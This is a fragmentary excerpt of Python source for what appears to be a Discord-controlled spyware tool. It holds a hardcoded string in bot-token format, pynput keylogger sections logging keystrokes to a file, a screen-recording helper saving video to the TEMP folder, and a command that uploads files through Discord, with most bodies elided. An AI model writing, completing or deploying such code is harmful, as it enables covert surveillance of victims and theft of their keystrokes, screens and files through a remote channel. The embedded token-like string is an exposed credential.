...
HzzH = "MTQwOTE2NTc4NDIwMjIxOTY5MQ.GOjq0L.7xLwmtJwZy339MPyRGiVcR3TBV7O8_xUVI8gAQ"
...
# --- Keylogger code (top-level, after bot creation) ---
...
# --- Screen recording helpers and command ---
import numpy as np
...
def record_screen(duration_sec):
    ...
    video_path = os.path.join(os.environ["TEMP"], "screen_output.avi")
...
async def send_file(ctx, file_path):
    ...
    if file_size > 10485760:
        await ctx.send("File too large for Discord upload.")
    else:
...
async def help(ctx):
    ...
    # --- Keylogger code (top-level, outside any function) ---
    from pynput import keyboard
    keylog_listener = None
    key_log = []
    log_file_path = "keylog.txt"
